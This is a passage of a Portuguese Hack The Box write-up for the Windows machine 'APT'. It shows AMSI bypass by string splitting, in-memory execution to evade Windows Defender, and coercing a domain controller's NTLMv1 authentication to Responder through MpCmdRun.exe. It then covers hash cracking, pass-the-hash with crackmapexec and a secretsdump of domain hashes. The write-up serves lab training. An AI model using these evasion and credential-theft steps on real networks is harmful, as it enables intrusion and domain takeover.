+<p>AMSI é tipo uma API que todos os programas podem usar para analisar sequências de string, e reporta como potencialmente perigoso toda e qualquer string comum em malware, virus, ect...</p>
+<h4 id="exemplo-com-a-prórpia-máquina-alvo"><a class="header" href="#exemplo-com-a-prórpia-máquina-alvo"><em>exemplo com a prórpia máquina alvo:</em></a></h4>
+<p><img src="Assets/HTB-Windows-Insane-APT/AMSI.png" alt="AMSI" /></p>
+<p>O Mimikatz é extremamente conhecido no mundo do Pentesting... E Windows Também o conhece. Existe uns scripts pelo github com o nome Invoke-Mimikatz.ps1, e que faz muitas coisinhas más ao Windows... Antes mesmo de executar o commando, o powershell envia a string para o AMSI analisar, e como Invoke-Mimikatz.ps1 é muitas vezes utilizada por black-hackers, o AMSI informa do potencial perigo e impede a sua execução. Uma das técnicas de bypass é a ofuscação:</p>
+<pre><code class="language-bash">&quot;Invo&quot; + &quot;ke-Mimi&quot; + &quot;katz&quot;
+#&gt;  Invoke-Mimikatz
+</code></pre>
+<p>Assim já funciona. Poderiamos também ter usado base64, ou caracteres em hexadecimal, ou octal, ect, e juntar várias técnicas... Mas para coisinhas pequena, está ok... Para scripts, isto é chato de se fazer... Existe no próprio evil-winrm a função Bypass-4MSI. Os comandos adicionais podem ser encontrados se escrevermos <strong><em>menu</em></strong> diretamente na interface Evil-WinRM</p>
+<p><img src="Assets/HTB-Windows-Insane-APT/Bypass_AMSI.png" alt="Bypass AMSI" /></p>
+<p>Poderíamos também resolver esse problema com one-liners que se podem encontrar facilmente neste site</p>
+<blockquote>
+<p>https://amsi.fail/</p>
+</blockquote>
+<h3 id="invoke-binary"><a class="header" href="#invoke-binary">Invoke-Binary</a></h3>
+<p>Agora que temos mais liberdade no powershelll, ainda falta bypassear o Windows Defender, pois se tentar executar novamente o winPEASx64.exe, Sou barrado na mesma pelo Windows Defender... O método que iremos utilizar também está diretamente contemplado no evil-winrm e consiste em executar o binário directamente em memória RAM, sem nunca passar pelo disco rígido (terreno protegido pelo Windows Defender!). O programa que queremos executar tem de ser um programa compilado em .Net assembly, para poder ser executado directamente da RAM com essa função... Não encontrei informações de como funciona o Invoke-Binary, mas do material que vi sobre outros scripts e programs em C para fazer a mesma coisa, percebi que o programa é copiado do computador atacante diretamente para a memória RAM e é-lhe ofuscado o código, mudando nomes de funções, mudando o caminho que deveria seguir o programa, saltando em pontos diferentes da memória, ou passando por caminhos só por passar, para enganar o antivírus. Para o antivírus não reconhecer padrões no assembly.</p>
+<p>Avançando! Com o evil-winrm, basta indicar que queremos usar essa função, passar o programa e o seus argumentos</p>
+<pre><code class="language-bash"># Target Machine
+Invoke-Binary /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe -h
+Invoke-Binary /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe log=C:\Users\henry.vinson_adm\Documents\winPEAS.out
+download &quot;C:/Users/henry.vinson_adm/Documents/winPEAS.out&quot;
+
+# Kali
+cat winPEAS.out
+</code></pre>
+<p><img src="Assets/HTB-Windows-Insane-APT/NLTMv1.png" alt="NTLMv1 winPEAS" /></p>
+<h2 id="responder"><a class="header" href="#responder">responder</a></h2>
+<p>Com a última informação recolhida, a saber, a máquina usa NTLMv1 para se autenticar, podemos tentar recuperar o hash NTLMv1.</p>
+<p>O <strong>responder</strong> permite fazer isso facilmente, mas temos de o preparar para que, quando obtivermos o hash, podermos decifrá-lo. O site https://crack.sh/ nos informa que podemos usar o salt 1122334455667788 gratuitamente para decifrar o NTLMv1.</p>
+<p>Temos de configurar o nosso responder.py para especificar o nosso salt:</p>
+<pre><code class="language-bash">which responder
+locate responder.conf
+cat /var/lib/dpkg/info/responder.conffiles
+#&gt;  /etc/responder/Responder.conf
+sudo nano /etc/responder/Responder.conf
+</code></pre>
+<p><img src="Assets/HTB-Windows-Insane-APT/salt_challenge.png" alt="Salt - Challenge" /></p>
+<p>Depois de forçar o SALT a 1122334455667788 para ser enviado quando nos for solicitado durante o Challenge Responde Protocol, é só ligar o responder e esperar...</p>
+<pre><code class="language-bash">sudo responder -I tun0 --lm -v
+</code></pre>
+<h2 id="mscmdrunexe"><a class="header" href="#mscmdrunexe">MsCmdRun.exe</a></h2>
+<p>Esperar... e esperar o que? o responder simula montes de serviços de partilha e afins, e captura hashes e informações criticas de quem se conecta a nossa máquina Kali. Mas neste plano, existe um problema... Ninguém vai-nos pedir coisas...</p>
+<p>Pois não. Ninguém vai porque é uma máquina HTB, mas mesmo assim, podemos forçar a que a máquina solicite coisas ao nosso responder, estamos ligado à máquina alvo com evil-winrm...</p>
+<p>Mas já temos tudo o que percisamos deste usuário, portanto nem vale a pena enviar petições ao nosso responder... Mas podemos fazer com que outro usuário faça uma petição... À pouco, percisámos burlar o Windows Defender... e agora, vamos percisar dele lool. Podemos dizer ao Windows Defender para verificar a perigosidade de um arquivo noutro ponto de rede. E o usuários que irá fazer isso é um administrador...</p>
+<pre><code class="language-bash">cd &quot;C:\Program Files\Windows Defender&quot;
+.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.21\test.txt
+</code></pre>
+<blockquote>
+<p>[SMB] NTLMv1 Hash : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788</p>
+</blockquote>
+<p>Recebemos o hash NTLMv1 Salteado com o Salt: 1122334455667788. Basta agora crackear isso pelo tal site...</p>
+<p>O formato que o site pede é esse: NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384 E vai pedir um email onde irá enviar a resposta. Vou usar um email10</p>
+<p><img src="Assets/HTB-Windows-Insane-APT/crack_sh.png" alt="crack.sh" /></p>
+<p><img src="Assets/HTB-Windows-Insane-APT/crack_sh_response.png" alt="mail10 crack.sh" /></p>
+<p>Já temos o hash NTLMv1 em claro:</p>
+<blockquote>
+<p>APT$:d167c3238864b12f5f82feae86a7f798</p>
+</blockquote>
+<pre><code class="language-bash">crackmapexec smb apt -u 'APT$' -H 'd167c3238864b12f5f82feae86a7f798'
+
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\APT$ d167c3238864b12f5f82feae86a7f798
+</code></pre>
+<p>As credenciais funcionam. Mas não temos capacidade de escrita, nem de psexec, nem de evil-winrm. Sabemos que este usuário é de Domínio, visto que se fizermos um <strong>&quot;net users&quot;</strong> na máquina com o usuário henry.vinson_adm, não o vemos lá. E sabemos também que é este usuário que executou o Windows Defender. Tem que ter muitos privilégios... possivelmente não pertence ao administradores, porque não nos é possível nos connectar com evil-winrm, mas tem que pertencer a algum grupo com muitos privilégios... Sendo assim, podemos tentar extrair todos os hashes de usuários de domínio com o secretsdump.py em &quot;Blind&quot;...</p>
+<h2 id="secretsdumppy"><a class="header" href="#secretsdumppy">Secretsdump.py</a></h2>
+<p><img src="Assets/HTB-Windows-Insane-APT/secrets_dump.png" alt="secretsdump.py" /></p>
+<p>Agora sim!! Temos um hash NTLM do usuário de domínio Administrator. Vamos tratar de validá-lo... e ver se temos capacidade de psexec ou assim...</p>
+<p><img src="Assets/HTB-Windows-Insane-APT/Shell_Administrator.png" alt="Shell do Administrator" /></p>
+<p>Temos um shell com privilégio total sobre o Domain Controller...</p>
+<p>Agora é só copiar as flags no HTB e está feito!!</p>
+<pre><code class="language-bash">cd C:\
+cmd /c 'dir /r /s root.txt user.txt 2&gt;NUL'
+
+type C:\Users\henry.vinson_adm\Desktop\user.txt
+#&gt;  6199e04eb2ad97edd89df0**********
+type C:\Users\Administrator\Desktop\root.txt
+#&gt;  e3e8e265c8402b3b28d968**********
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../HTB/HTB-Windows-Insane-Bankrobber.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next" href="../Linux.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../HTB/HTB-Windows-Insane-Bankrobber.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next" href="../Linux.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
+
+        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </body>
+</html>
